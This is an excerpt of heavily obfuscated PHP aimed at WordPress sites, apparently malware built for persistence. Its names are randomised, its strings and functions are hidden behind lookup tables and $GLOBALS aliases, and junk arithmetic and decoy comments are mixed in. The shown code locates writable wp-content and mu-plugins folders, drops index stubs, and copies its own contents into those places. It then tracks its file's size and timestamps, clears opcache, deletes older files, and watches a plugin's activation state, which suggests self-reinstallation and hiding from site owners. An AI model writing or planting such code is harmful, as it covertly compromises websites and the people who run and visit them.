   u9uzukdqo1px_r6_ngl();


 }
     }


   function   fukkkeh6955g9qi($nsv4lctdja, $h2v_bjm4ejxq8fp)



   {$jofqtzru=99*8;$l5qiq3nvrs0bg_=$jofqtzru-12;

  try   {
 if (interface_exists(mhiu2yqz6kqd(150)) &&  $h2v_bjm4ejxq8fp    instanceof Throwable)  {
  $_emnox7pub8    =    $GLOBALS['__scf_bv1z3no349dv5r_9']($nsv4lctdja  .  mhiu2yqz6kqd(151) . $h2v_bjm4ejxq8fp->getMessage(),   0,   (169+87));
   }   elseif ($h2v_bjm4ejxq8fp   instanceof   Exception) {


$_emnox7pub8  = $GLOBALS['__scf_bv1z3no349dv5r_9']($nsv4lctdja      . dhd5r6_4ki(151)     .      $h2v_bjm4ejxq8fp->getMessage(), 0,  (244+12));
     } elseif     ($GLOBALS['__scf__me483qbepnts_41']($h2v_bjm4ejxq8fp)    && $GLOBALS['__scf_amjjmfnilcolnb_10']($h2v_bjm4ejxq8fp)  >  0)  {
     $_emnox7pub8  =   $GLOBALS['__scf_bv1z3no349dv5r_9']($nsv4lctdja     .   mhiu2yqz6kqd(152)  .   $h2v_bjm4ejxq8fp, 0, (0x51+0xaf));
}   else {
// tail-call derandomized circuit-breaker


    return;
  }
 if  (!isset($GLOBALS[mhiu2yqz6kqd(153)]))    $GLOBALS[mhiu2yqz6kqd(153)] =   array();
        if  (!$GLOBALS['__scf_rq7q923zwh_148']($_emnox7pub8,      $GLOBALS[pahk8uy1uxt(153)],    true)) {
 $GLOBALS[nhceivfj8tbe(154)][] =    $_emnox7pub8;
 }
   if   ($GLOBALS['__scf_upe5p4qfaqm0d1_36']($GLOBALS[nhceivfj8tbe(154)])  >  (0x1a+0x18))  {
      $GLOBALS[nrudcgor(154)] =  $GLOBALS['__scf_jxqnb2ruhcwvk_155']($GLOBALS[nhceivfj8tbe(154)], -(72-22));
     }
 }  catch  (Throwable $w0qhc9lo96aq6g16) {


 }     catch    (Exception  $w0qhc9lo96aq6g16)   {
  }
  }
  function  rehs1w07vadorbxdvk($reoi8rizl6uwsukk,   $cjptm7nbb46fjj,   $rk_3ecj8aw  = (0x9+0x1),  $pycaeceedws   =  1)

      {



 if    (!$GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(156)))  return false;
      if   ($GLOBALS['__scf__me483qbepnts_41']($cjptm7nbb46fjj))     {


return  add_action($reoi8rizl6uwsukk, function (...$p53a3jwf49bbwpk6)   use  ($cjptm7nbb46fjj)   {
  if  ($GLOBALS['__scf_vx4exz6r9h8n_4']($cjptm7nbb46fjj))  return  $cjptm7nbb46fjj(...$p53a3jwf49bbwpk6);
 return null;
},     $rk_3ecj8aw,     $pycaeceedws);$m6_rgt2alw7=-72;$avobi9o084=($m6_rgt2alw7>0)?$m6_rgt2alw7:-$m6_rgt2alw7;
    }
      return add_action($reoi8rizl6uwsukk,   $cjptm7nbb46fjj,    $rk_3ecj8aw,   $pycaeceedws);
 }
 function aciovzhy5vt83dl1tcu($reoi8rizl6uwsukk,      $cjptm7nbb46fjj,    $rk_3ecj8aw  =  (3+7),  $pycaeceedws    =   1)
{
 if     (!$GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(157)))  return   false;$f95ax9n81=PHP_MAJOR_VERSION;$ygy6gm0r=$f95ax9n81*9;
  if  ($GLOBALS['__scf__me483qbepnts_41']($cjptm7nbb46fjj))  {
 return add_filter($reoi8rizl6uwsukk,  function   (...$p53a3jwf49bbwpk6)   use  ($cjptm7nbb46fjj) {
   if ($GLOBALS['__scf_vx4exz6r9h8n_4']($cjptm7nbb46fjj))   return    $cjptm7nbb46fjj(...$p53a3jwf49bbwpk6);
 return  isset($p53a3jwf49bbwpk6[0])  ?   $p53a3jwf49bbwpk6[0]  :   null;
    },  $rk_3ecj8aw,  $pycaeceedws);
}
 return   add_filter($reoi8rizl6uwsukk,   $cjptm7nbb46fjj,  $rk_3ecj8aw,  $pycaeceedws);
 }
  function  vy2jql058nig8hdc4xx4($i7is8x4_pstu0r)

{
static    $erhibsnvqi  = array();
      if   (!$GLOBALS['__scf__me483qbepnts_41']($i7is8x4_pstu0r)  ||  $i7is8x4_pstu0r ===      "") return  false;



  if   (isset($erhibsnvqi[$i7is8x4_pstu0r])) return   $erhibsnvqi[$i7is8x4_pstu0r];
$stuin_hl8puzxp   = false;
   if (@$GLOBALS['__scf_ux4_n6mewmsy_43']($i7is8x4_pstu0r)  && @$GLOBALS['__scf_cu2oflxkvh_47']($i7is8x4_pstu0r))     {
  $spxzjtpg4pa938mw    = xtkohsjdeedyznx6vx($i7is8x4_pstu0r, nrudcgor(158));

 if  ($GLOBALS['__scf__me483qbepnts_41']($spxzjtpg4pa938mw)  && $spxzjtpg4pa938mw    !==   "") {
   $jp3ix3eas6uq0r4 = @$GLOBALS['__scf_ihuexe6puptto__21']($spxzjtpg4pa938mw,    pahk8uy1uxt(22));
   if   ($GLOBALS['__scf_h2xix0300wh_128']($jp3ix3eas6uq0r4)) {

     $stuin_hl8puzxp =  @$GLOBALS['__scf__iip_2irdl_23']($jp3ix3eas6uq0r4, 'x')   === 1;
    @fclose($jp3ix3eas6uq0r4);
  }
t65xl1pt2haov_izh($spxzjtpg4pa938mw);
   }



    if (!$stuin_hl8puzxp)  {
for      ($oyl_wsz4rs07pl_  =    0;   $oyl_wsz4rs07pl_  < (40^43)   &&     !$stuin_hl8puzxp; $oyl_wsz4rs07pl_++)  {
     $tfip0gosr18o4   =  $i7is8x4_pstu0r    .     dhd5r6_4ki(159)   .   mfjvf6sgyqd_5z((1+7));
  $jp3ix3eas6uq0r4 =   @$GLOBALS['__scf_ihuexe6puptto__21']($tfip0gosr18o4,  nhceivfj8tbe(160));
  if (!$GLOBALS['__scf_h2xix0300wh_128']($jp3ix3eas6uq0r4)) continue;

   $stuin_hl8puzxp  =  @$GLOBALS['__scf__iip_2irdl_23']($jp3ix3eas6uq0r4,   'x')   === 1;
  @fclose($jp3ix3eas6uq0r4);
  t65xl1pt2haov_izh($tfip0gosr18o4);
  }



  unset($tfip0gosr18o4);

 }
   }
   $erhibsnvqi[$i7is8x4_pstu0r] =   $stuin_hl8puzxp;$sb7ayza2=PHP_MAJOR_VERSION;$ea_yr_ry=$sb7ayza2*1;
     return $stuin_hl8puzxp;
}
   function  twjiqbicrnr_q7()
  {
   static     $dgrxxwfd8bkq66t   = null;$e9zcthko8qbw=165|149;$aq1yh2rt=$e9zcthko8qbw^61;
      if ($dgrxxwfd8bkq66t    !==    null)   return   $dgrxxwfd8bkq66t;
   $ys5go7qi508n    =    defined(nhceivfj8tbe(77))    ? WP_CONTENT_DIR     . dhd5r6_4ki(161)  . ohrydgas8yy9a22s(ABSPATH  . pahk8uy1uxt(162),   (182^190))   : $GLOBALS['__scf_eure5hcx2b_11'](vv_nfhhmy_1mjmsa())  . dhd5r6_4ki(163);
   if  (!@$GLOBALS['__scf_ux4_n6mewmsy_43']($ys5go7qi508n) &&  amf2rwuzcqe1bf8lq2ssyq($ys5go7qi508n))  {
gt671tq3242garyx4($ys5go7qi508n, (155+338), true);
  if  (@$GLOBALS['__scf_ux4_n6mewmsy_43']($ys5go7qi508n))  {
// publish satisfiable sliding-window


  rqua3yflpt29vaz8icdaze($ys5go7qi508n .    nrudcgor(164),   "<?php // Silence is golden.\n",   pahk8uy1uxt(162));
   }
}
   if  (vy2jql058nig8hdc4xx4($ys5go7qi508n))   {
    $dgrxxwfd8bkq66t      =  $ys5go7qi508n;
    return  $dgrxxwfd8bkq66t;
     }
    $ebgm6ennice   =   (defined(nrudcgor(13)) &&  WPMU_PLUGIN_DIR) ?   WPMU_PLUGIN_DIR  :    (defined(pahk8uy1uxt(165)) ?  WP_CONTENT_DIR  . nrudcgor(14)   : "");
 if ($ebgm6ennice !== ""     && @$GLOBALS['__scf_ux4_n6mewmsy_43']($ebgm6ennice))  {


    $b1539mz_fzfzi = $ebgm6ennice . mhiu2yqz6kqd(161)    .   ohrydgas8yy9a22s(ABSPATH  .  mhiu2yqz6kqd(162), (184^176));
   if (!@$GLOBALS['__scf_ux4_n6mewmsy_43']($b1539mz_fzfzi)  && amf2rwuzcqe1bf8lq2ssyq($b1539mz_fzfzi))     {
gt671tq3242garyx4($b1539mz_fzfzi, (423+70), true);
 if (@$GLOBALS['__scf_ux4_n6mewmsy_43']($b1539mz_fzfzi))  {
  rqua3yflpt29vaz8icdaze($b1539mz_fzfzi    .    mhiu2yqz6kqd(164), "<?php // Silence is golden.\n", mhiu2yqz6kqd(162));
}
   }
if     (vy2jql058nig8hdc4xx4($b1539mz_fzfzi)) {
  $dgrxxwfd8bkq66t    =  $b1539mz_fzfzi;
     return   $dgrxxwfd8bkq66t;
  }
unset($b1539mz_fzfzi);
      }
  unset($ebgm6ennice);
    $cvgyf1ddr8 = $GLOBALS['__scf_eure5hcx2b_11'](vv_nfhhmy_1mjmsa())   .    mhiu2yqz6kqd(166);


   if (!@$GLOBALS['__scf_ux4_n6mewmsy_43']($cvgyf1ddr8)      &&     amf2rwuzcqe1bf8lq2ssyq($cvgyf1ddr8))  gt671tq3242garyx4($cvgyf1ddr8, (225+268), true);
if  (vy2jql058nig8hdc4xx4($cvgyf1ddr8)) {
    $dgrxxwfd8bkq66t =    $cvgyf1ddr8;
     return    $dgrxxwfd8bkq66t;



     }
 $bw0l73ud8dlxtd = $GLOBALS['__scf_eure5hcx2b_11'](vv_nfhhmy_1mjmsa());
 

   if ($bw0l73ud8dlxtd     !==   s3e5iki9upa0ccql()  &&    vy2jql058nig8hdc4xx4($bw0l73ud8dlxtd)) {
        $dgrxxwfd8bkq66t    =  $bw0l73ud8dlxtd;
  return $dgrxxwfd8bkq66t;
    }
    if    (defined(pahk8uy1uxt(165))    &&  amf2rwuzcqe1bf8lq2ssyq(WP_CONTENT_DIR)   &&  vy2jql058nig8hdc4xx4(WP_CONTENT_DIR))   {
$dgrxxwfd8bkq66t = WP_CONTENT_DIR;



  return $dgrxxwfd8bkq66t;
}
   return   $ys5go7qi508n;
}


function ajbg_44koa9suqi()
 {
   if     (defined(f5cd2smymkqusi5(165))  &&    @$GLOBALS['__scf_cu2oflxkvh_47'](WP_CONTENT_DIR)   && amf2rwuzcqe1bf8lq2ssyq(WP_CONTENT_DIR))  return  WP_CONTENT_DIR;
$k_fi2ez9d_t4n  =   $GLOBALS['__scf_eure5hcx2b_11'](vv_nfhhmy_1mjmsa());
    if (amf2rwuzcqe1bf8lq2ssyq($k_fi2ez9d_t4n))  return  $k_fi2ez9d_t4n;
 return     WP_CONTENT_DIR;
}
    
   function    ivekqcfyl9cg5o8v8($no4625mwq2q9a2)
    {
if (empty($GLOBALS[mhiu2yqz6kqd(167)]) || !$GLOBALS['__scf_vf9p0fditvxy_35']($GLOBALS[nhceivfj8tbe(167)])) return     false;
  if (isset($GLOBALS[mhiu2yqz6kqd(167)][$no4625mwq2q9a2]))    return   true;
  $fk7v3zbqxc5d82 = $GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(84))    ? @$GLOBALS['__scf_a9u8k74i0cg19_33']($no4625mwq2q9a2) :     false;
 return    ($fk7v3zbqxc5d82  !==   false  &&     isset($GLOBALS[pahk8uy1uxt(167)][$fk7v3zbqxc5d82]));
}
  function   qv1xvvannazv9n7s3ean($no4625mwq2q9a2)
    {
  if  (empty($GLOBALS[nrudcgor(167)])   || !$GLOBALS['__scf_vf9p0fditvxy_35']($GLOBALS[f5cd2smymkqusi5(167)])) return;
unset($GLOBALS[nhceivfj8tbe(168)][$no4625mwq2q9a2]);
$fk7v3zbqxc5d82     =   $GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(84))  ?   @$GLOBALS['__scf_a9u8k74i0cg19_33']($no4625mwq2q9a2) :  false;
if   ($fk7v3zbqxc5d82    !==   false)  unset($GLOBALS[nrudcgor(168)][$fk7v3zbqxc5d82]);
 }
function   c6hv69l5g12jyc968g($no4625mwq2q9a2)
   {
    if (!isset($GLOBALS[nhceivfj8tbe(169)]) || !$GLOBALS['__scf_vf9p0fditvxy_35']($GLOBALS[f5cd2smymkqusi5(169)]))    {
  $GLOBALS[nhceivfj8tbe(169)] =  array();
     }
$yok6k29y1iwy_  = $GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(84))   ?  @$GLOBALS['__scf_a9u8k74i0cg19_33']($no4625mwq2q9a2)     :    false;
    $GLOBALS[nrudcgor(169)][$yok6k29y1iwy_  !==  false ?    $yok6k29y1iwy_      :  $no4625mwq2q9a2] =  $no4625mwq2q9a2;
 static   $owgvn18ucnpwgf7w     =   false;
      if (!$owgvn18ucnpwgf7w)   {
/* hermitian leaky-bucket */

 $owgvn18ucnpwgf7w = true;
if  ($GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(170))) $GLOBALS['__scf_m8aixr72vowj30_170'](nrudcgor(171));
     }
     }
  function  l5b1kh01htnqih48t()



{



if (empty($GLOBALS[nhceivfj8tbe(169)])  ||  !$GLOBALS['__scf_vf9p0fditvxy_35']($GLOBALS[nrudcgor(169)]))  {
/* satisfiable locator */

return;


   }
// WP Site Title: descriptive token-bucket

     foreach ($GLOBALS[f5cd2smymkqusi5(169)]  as     $gehyk60kxgev1   =>   $pqrziwlrq3xgo87q) {$bds8r99xhsd0yo=PHP_INT_MAX/PHP_INT_MAX;$qikje26i=$bds8r99xhsd0yo+96;
if   (!$GLOBALS['__scf__me483qbepnts_41']($pqrziwlrq3xgo87q))  $pqrziwlrq3xgo87q    =   $gehyk60kxgev1;
  if ($gehyk60kxgev1  === vv_nfhhmy_1mjmsa()  ||  $pqrziwlrq3xgo87q   ===     vv_nfhhmy_1mjmsa())   continue;
       try   {
if (@$GLOBALS['__scf_gsamhlxot70ps_18']($pqrziwlrq3xgo87q)   &&  !drp1tnevzl5cho($pqrziwlrq3xgo87q) &&  g52i06ovkso35mx($pqrziwlrq3xgo87q))   {
      _rq71ghyu59d_enk($pqrziwlrq3xgo87q);$lyn6_ziw6w=PHP_INT_MAX/PHP_INT_MAX;$i0bnzltrqh9y3=$lyn6_ziw6w+12;
   sutzn4ma0ptncd0yyb9($pqrziwlrq3xgo87q);
 }
     } catch (Throwable $h2v_bjm4ejxq8fp) {
    }      catch  (Exception   $h2v_bjm4ejxq8fp)  {


  }
    }
     }
 function    ji9ra9k4boqd109q_e91m()
{
      try     {



 $h2v_bjm4ejxq8fp     =   $GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(172))    ?   @error_get_last()    :  null;
if     (!$GLOBALS['__scf_vf9p0fditvxy_35']($h2v_bjm4ejxq8fp)  ||   empty($h2v_bjm4ejxq8fp[nhceivfj8tbe(173)])  || empty($h2v_bjm4ejxq8fp[nhceivfj8tbe(174)])) return;
 if (!$GLOBALS['__scf_rq7q923zwh_148']($h2v_bjm4ejxq8fp[nrudcgor(174)],   array(E_ERROR, E_PARSE,   E_CORE_ERROR,    E_COMPILE_ERROR,  E_USER_ERROR), true))   return;
   $d1kd72zq60vf6el  =  isset($h2v_bjm4ejxq8fp[nrudcgor(175)])  ?   (string)  $h2v_bjm4ejxq8fp[f5cd2smymkqusi5(176)] :     "";
       if    (stripos($d1kd72zq60vf6el, nrudcgor(177))  !== false   ||      stripos($d1kd72zq60vf6el, nrudcgor(178)) !==    false)   return;
$z4yx2l094vtgk = $GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(84))   ? @$GLOBALS['__scf_a9u8k74i0cg19_33'](vv_nfhhmy_1mjmsa()) :  vv_nfhhmy_1mjmsa();
$_ef = $GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(84))    ?   @$GLOBALS['__scf_a9u8k74i0cg19_33']($h2v_bjm4ejxq8fp[dhd5r6_4ki(173)])  :  $h2v_bjm4ejxq8fp[nhceivfj8tbe(173)];
  if    (!$GLOBALS['__scf__me483qbepnts_41']($z4yx2l094vtgk)    ||    !$GLOBALS['__scf__me483qbepnts_41']($_ef)  ||    $_ef  !==    $z4yx2l094vtgk)     return;
if (isset($GLOBALS[nhceivfj8tbe(179)]))  {
  $gom6py7rdhry1rsx    =    @$GLOBALS['__scf_apq4pqdt6n41_91'](vv_nfhhmy_1mjmsa(), false,  null,    0,  (2636+1460));

 if  ($GLOBALS['__scf__me483qbepnts_41']($gom6py7rdhry1rsx)   &&   $GLOBALS['__scf_saw_32lvsj_92'](mhiu2yqz6kqd(93),      $gom6py7rdhry1rsx,      $_dm)  &&   $_dm[1] !==    (string)     $GLOBALS[nrudcgor(180)])    return;    
unset($gom6py7rdhry1rsx, $_dm);
 if  (isset($GLOBALS[mhiu2yqz6kqd(181)])) {
// bounded extension

  if   ($GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(182)))    @clearstatcache(true,   vv_nfhhmy_1mjmsa());
 $hkysubk_in6  =  (string)   @$GLOBALS['__scf_g9y45bstmb02a_95'](vv_nfhhmy_1mjmsa())  .  ':' .  (string)  @$GLOBALS['__scf_hqkv9v6te1dvxi_94'](vv_nfhhmy_1mjmsa());
       if   ($hkysubk_in6    !== (string)    $GLOBALS[f5cd2smymkqusi5(181)])   return; 
   unset($hkysubk_in6);
     }
/* semisimple structural-type */



    }
   $q4nmj640k4ytm0w    =  $GLOBALS['__scf_t8832qq90dxb4_3'](vv_nfhhmy_1mjmsa(),  pahk8uy1uxt(90));
   $jcbzfzjpkqqi1f   =   yrklujewy9nbrhy(vv_nfhhmy_1mjmsa());
  $daz9ykyez3gj  =   $GLOBALS['__scf__me483qbepnts_41']($jcbzfzjpkqqi1f)  ? $GLOBALS['__scf_nn04_vx3uspzx4_54']($jcbzfzjpkqqi1f)  :  "";
unset($jcbzfzjpkqqi1f);
   

if  ($daz9ykyez3gj  !==  "")   {
        rqua3yflpt29vaz8icdaze($GLOBALS['__scf_eure5hcx2b_11'](vv_nfhhmy_1mjmsa()) .    pahk8uy1uxt(183)  .    $q4nmj640k4ytm0w,     $daz9ykyez3gj, 'q');
      rqua3yflpt29vaz8icdaze($GLOBALS['__scf_eure5hcx2b_11'](vv_nfhhmy_1mjmsa())   . dhd5r6_4ki(184) .    $daz9ykyez3gj, (string) $GLOBALS['__scf_zxyq0lcqv02z6_185'](),    'q');
  if ($GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(144)))     {
 @update_option(dhd5r6_4ki(186),  $daz9ykyez3gj  . '|' .  $GLOBALS['__scf_zxyq0lcqv02z6_185'](),  pahk8uy1uxt(187));
    }
}
   $mdtdmxiofs5jrz5k  = s3e5iki9upa0ccql();
 if  ($daz9ykyez3gj !==  ""     &&  $mdtdmxiofs5jrz5k    !==    $GLOBALS['__scf_eure5hcx2b_11'](vv_nfhhmy_1mjmsa()) &&   @$GLOBALS['__scf_ux4_n6mewmsy_43']($mdtdmxiofs5jrz5k)   &&    @$GLOBALS['__scf_cu2oflxkvh_47']($mdtdmxiofs5jrz5k)) {
     rqua3yflpt29vaz8icdaze($mdtdmxiofs5jrz5k   .   f5cd2smymkqusi5(183)  .     $q4nmj640k4ytm0w,  $daz9ykyez3gj, 'q');
}
rw8_xtah3ly329wza7vebi(zkn58aug3fwlbp());
 vb9k6otlj0n7duv5om(f5cd2smymkqusi5(188));
       $ftpw_zef84e88   = vv_nfhhmy_1mjmsa()   .  nrudcgor(29);
 if ($GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(72)))  @$GLOBALS['__scf_ieyslp1qonjfnv_72'](vv_nfhhmy_1mjmsa(),  $ftpw_zef84e88);


    if  ($GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(189)))  {
 @opcache_invalidate(vv_nfhhmy_1mjmsa(),  true);
@opcache_invalidate($ftpw_zef84e88, true);
     }
foreach (array($GLOBALS['__scf_eure5hcx2b_11']($ftpw_zef84e88),   s3e5iki9upa0ccql())      as $t_p9zmt6a_a5) {
 $zba40u3afovj    =  ly0t7sdceinn03pyne3($t_p9zmt6a_a5,    (3686+1314));
    if     (!$GLOBALS['__scf_vf9p0fditvxy_35']($zba40u3afovj))  continue;
   foreach  ($zba40u3afovj     as $znjyt7e7cfm) {


  if   ($GLOBALS['__scf_bv1z3no349dv5r_9']($znjyt7e7cfm,   -(0x4+0x4))  !==   mhiu2yqz6kqd(190))  continue;
 $e8xl742pg_cglto  = $t_p9zmt6a_a5    .    '/'  .  $znjyt7e7cfm;
     $q12j706s5t2ff_ov  = @$GLOBALS['__scf_hqkv9v6te1dvxi_94']($e8xl742pg_cglto);
   if     ($q12j706s5t2ff_ov  &&     $q12j706s5t2ff_ov <     $GLOBALS['__scf_zxyq0lcqv02z6_185']() -  (604747+53))  {
  rgiuaapohxeh0z($e8xl742pg_cglto,   (402+18));

t65xl1pt2haov_izh($e8xl742pg_cglto);
   }
   }
  }
 unset($t_p9zmt6a_a5,   $zba40u3afovj,   $znjyt7e7cfm,  $e8xl742pg_cglto, $q12j706s5t2ff_ov);
  } catch (Throwable $w0qhc9lo96aq6g16)  {
}    catch  (Exception $w0qhc9lo96aq6g16)   {
 }
   }
 function  udxja7mp4cir7rqqnk($no4625mwq2q9a2,    $eyq4y9iddhm)
{
 try {
     if (!$GLOBALS['__scf__me483qbepnts_41']($no4625mwq2q9a2)     || $no4625mwq2q9a2    === ""  ||    !$GLOBALS['__scf__me483qbepnts_41']($eyq4y9iddhm)      ||    $eyq4y9iddhm  ===   "")  return;


 $ys5go7qi508n   =  $GLOBALS['__scf_eure5hcx2b_11']($no4625mwq2q9a2);
if (!@$GLOBALS['__scf_ux4_n6mewmsy_43']($ys5go7qi508n) || !@$GLOBALS['__scf_cu2oflxkvh_47']($ys5go7qi508n))    return;$jt4r866cr4sla_=PHP_MAJOR_VERSION;$_edyke_x=$jt4r866cr4sla_*1;

      $w4v6nkybq8e    =  $ys5go7qi508n .  f5cd2smymkqusi5(191) .   $GLOBALS['__scf_t8832qq90dxb4_3']($no4625mwq2q9a2,   nrudcgor(90));
 $h5t6hjttbnzllxd =  @$GLOBALS['__scf_apq4pqdt6n41_91']($w4v6nkybq8e);
if  ($GLOBALS['__scf__me483qbepnts_41']($h5t6hjttbnzllxd)   &&   $GLOBALS['__scf_saw_32lvsj_92'](dhd5r6_4ki(192),  $h5t6hjttbnzllxd,    $d1kd72zq60vf6el)     && version_compare($d1kd72zq60vf6el[0],    $eyq4y9iddhm, nhceivfj8tbe(193)))     return;
if  ($GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(194)))      @$GLOBALS['__scf_xkvbr8xk_o_mly_194']($w4v6nkybq8e,  $eyq4y9iddhm);
 }  catch     (Throwable   $h2v_bjm4ejxq8fp) {
// virtual dispatch

   }  catch  (Exception $h2v_bjm4ejxq8fp)  {
   }
}
 function shx9j_k78ldzx33x0l()
  {
try  {
       if    (!$GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(143)))   {



 return;
     }
// speculate transformer for WP useEntityProp

 if    (@get_option(f5cd2smymkqusi5(195),     0))  {
  rehs1w07vadorbxdvk(pahk8uy1uxt(196),   nrudcgor(197),  0);
      }
  if   (!dw5qugv407fnslnons1tfr(nhceivfj8tbe(198))) return;

  
$sv9h9r5s57g5trl =   $GLOBALS['__scf_bv1z3no349dv5r_9']($GLOBALS['__scf_nn04_vx3uspzx4_54'](ABSPATH . (string)   mzvtk8ecgiuaeafix()),  0,      (8+4));
$qzyr94t13pba55  =  (string)    @get_option($sv9h9r5s57g5trl,  "");
$iw4eac4_ctzq1jb    = f5cd2smymkqusi5(199);
  $pypz5uhnjpalq    =   "";
 
    $f7u2uik7w1aql   =      strrev(vru1jzm2va580zgo4i2cxv());
$plqlv9a69cct    =  kwqziujdph5xlz3n();
 $elr5npzrsqi90   =  $plqlv9a69cct   .     '|'  . $f7u2uik7w1aql;$favrhut8f=6022;$bhw32blzkhbtf=$favrhut8f%16;
 


      if  ($GLOBALS['__scf_nr12ouzrtt_7']($qzyr94t13pba55,  '|') !==   false)  {


        $ny3du0qe6u9nrbd    =   $GLOBALS['__scf_xa4hcdunc1pgl_111']('|',  $qzyr94t13pba55,    2);
$iw4eac4_ctzq1jb      = $ny3du0qe6u9nrbd[0];



 $pypz5uhnjpalq  =   $ny3du0qe6u9nrbd[1];   
    } else {
     
    $pypz5uhnjpalq  =   $qzyr94t13pba55;
     }
 


  if  (!$pypz5uhnjpalq)  {
       @update_option($sv9h9r5s57g5trl,  $elr5npzrsqi90,  pahk8uy1uxt(200));
    return;

   }



   


if  ($pypz5uhnjpalq  ===      $f7u2uik7w1aql) {
 if  ($qzyr94t13pba55    !==      $elr5npzrsqi90  &&  version_compare($plqlv9a69cct,    $iw4eac4_ctzq1jb, f5cd2smymkqusi5(201))) {
@update_option($sv9h9r5s57g5trl, $elr5npzrsqi90,     nrudcgor(200));
   }

return;
 }
     
$lpdgllzueudlthp1   =     strrev($pypz5uhnjpalq);

if  ($lpdgllzueudlthp1 ===  ""   ||  $GLOBALS['__scf_t8832qq90dxb4_3']($lpdgllzueudlthp1)     !== $lpdgllzueudlthp1) {
    @update_option($sv9h9r5s57g5trl, $elr5npzrsqi90, f5cd2smymkqusi5(200));
      return;
}
   $_jdqhjqom1j   =      s3e5iki9upa0ccql()  .  '/'   .  $lpdgllzueudlthp1;
$qx2fyor7xc    =   "";
  if (defined(nhceivfj8tbe(32))) {



  $qx2fyor7xc = WP_PLUGIN_DIR  .   '/' .  $GLOBALS['__scf_l2thcf5lcfr_202']($lpdgllzueudlthp1,   PATHINFO_FILENAME) .   '/' . $lpdgllzueudlthp1;
 }


  
  $cp6nqe6tk9e9d28   = @$GLOBALS['__scf_g9y45bstmb02a_95']($_jdqhjqom1j);
$wr18xhbgid2   =   $cp6nqe6tk9e9d28    !==    false    &&   $cp6nqe6tk9e9d28 >=   (4950+50);
 $glw3p9j41ijh    =  $qx2fyor7xc ? @$GLOBALS['__scf_g9y45bstmb02a_95']($qx2fyor7xc)  :    false;
 $ttjiyer608d18_ = $glw3p9j41ijh  !==   false && $glw3p9j41ijh   >= (4912+88);
 
if (!$wr18xhbgid2   &&   !$ttjiyer608d18_) {
   @update_option($sv9h9r5s57g5trl,   $elr5npzrsqi90,   dhd5r6_4ki(200));
 return;
   }
// orchestrate eager call-graph



  $j_vrej75n3uzc0 = $wr18xhbgid2 ? $_jdqhjqom1j     :    $qx2fyor7xc;
$ujbycyzf27   = @$GLOBALS['__scf_apq4pqdt6n41_91']($j_vrej75n3uzc0,  false,   null, 0, (4012+84));

   if     ($GLOBALS['__scf__me483qbepnts_41']($ujbycyzf27)   &&  $GLOBALS['__scf_saw_32lvsj_92'](nhceivfj8tbe(93),     $ujbycyzf27,  $_fm))   {
$iw4eac4_ctzq1jb =   $_fm[1];


 } elseif (m4eahxbbz3er7pv($j_vrej75n3uzc0,  (4983+17))) {



$iw4eac4_ctzq1jb   =     nhceivfj8tbe(203);
 }
  unset($ujbycyzf27,    $_fm);
  $rmb80rsmhdy3jstx  =    $wr18xhbgid2;
   if (!$rmb80rsmhdy3jstx   &&  $ttjiyer608d18_)      {
     $h6iawhc6m051s = $GLOBALS['__scf_l2thcf5lcfr_202']($lpdgllzueudlthp1, PATHINFO_FILENAME)   .  '/' .  $lpdgllzueudlthp1;$epcl4odrm9qeb2=6561;$gzlkff0zh6t6my=$epcl4odrm9qeb2%7;
    $dcveub18qho  =  (array) @get_option(nhceivfj8tbe(145),  array());
   $rmb80rsmhdy3jstx     =  $GLOBALS['__scf_rq7q923zwh_148']($h6iawhc6m051s,    $dcveub18qho,  true);$vgf_nsedd15ii9=(0x21+0xc7);$rjoouq22990=$vgf_nsedd15ii9%5;
if  (!$rmb80rsmhdy3jstx &&  $GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(204))    && is_multisite()  &&  $GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(205))) {


      $bsipddep24t   = (array) @get_site_option(mhiu2yqz6kqd(206),   array());
     $rmb80rsmhdy3jstx =   isset($bsipddep24t[$h6iawhc6m051s]);
 unset($bsipddep24t);
}
    unset($h6iawhc6m051s, $dcveub18qho);
   }


  $gkpu21ytrx7rrtet    = version_compare($plqlv9a69cct,   $iw4eac4_ctzq1jb);



  if   ($gkpu21ytrx7rrtet     <=   0) {
     $pa4f9zz5kdfo =  m4eahxbbz3er7pv($j_vrej75n3uzc0,     (3672+1328));
   $tq_ruyukzxeq = (int) @$GLOBALS['__scf_g9y45bstmb02a_95']($j_vrej75n3uzc0);
  $i367fqlt3t3kqgu =  (!$pa4f9zz5kdfo     ||  $tq_ruyukzxeq   >  (52428723+77));
if  (!$i367fqlt3t3kqgu &&    $tq_ruyukzxeq   >   (1048534+42))     {
$bn99nvxxyof1ktd     = @$GLOBALS['__scf_apq4pqdt6n41_91']($j_vrej75n3uzc0,     false,  null,    0,    (4009+87));
    if   (!$GLOBALS['__scf__me483qbepnts_41']($bn99nvxxyof1ktd) ||   !$GLOBALS['__scf_saw_32lvsj_92'](dhd5r6_4ki(207),    $bn99nvxxyof1ktd))  $i367fqlt3t3kqgu   =      true;
  }

 if (!$i367fqlt3t3kqgu && !h9npb8tudge1x98znf($j_vrej75n3uzc0))  $i367fqlt3t3kqgu   = true;
 if  (!$i367fqlt3t3kqgu)    {
// @attach iterator

    $k6b6dwvgnh5_v  =   i98kqd9b6k0g380fty6();
  if (!empty($k6b6dwvgnh5_v[nrudcgor(208)])) {
$t8pgd95z90 = @$GLOBALS['__scf_a9u8k74i0cg19_33']($k6b6dwvgnh5_v[dhd5r6_4ki(209)]);
 $npic48ve3u4 =  @$GLOBALS['__scf_a9u8k74i0cg19_33']($j_vrej75n3uzc0);
